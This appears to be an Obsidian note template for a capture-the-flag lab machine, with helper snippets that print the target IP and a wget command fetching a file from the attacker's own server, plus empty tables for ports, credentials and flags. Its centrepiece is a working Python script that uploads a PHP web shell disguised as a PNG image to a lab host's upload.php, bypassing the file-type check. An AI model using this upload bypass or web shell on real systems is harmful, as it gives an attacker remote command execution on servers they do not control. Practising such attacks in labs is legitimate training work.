[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```
#!/usr/bin/env python3
import requests

def main():
    url = "http://10.129.25.107:8080/upload.php?id=test"

    s = requests.Session()
    s.get(url, verify=False)

    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'

    png = {
        'file': (
            'test.php.png',
            PNG_magicBytes + '\n' + '<?php echo shell_exec($_GET["cmd"]); ?>',
            'image/png',
            {'Content-Disposition': 'form-data'}
        )
    }

    data = {
        'pupload': 'upload'
    }

    r = s.post(
        url=url,
        files=png,
        data=data,
        verify=False
    )

    print("Uploaded!")

if __name__ == "__main__":
    main()
```

wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
| 8080 | http    |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```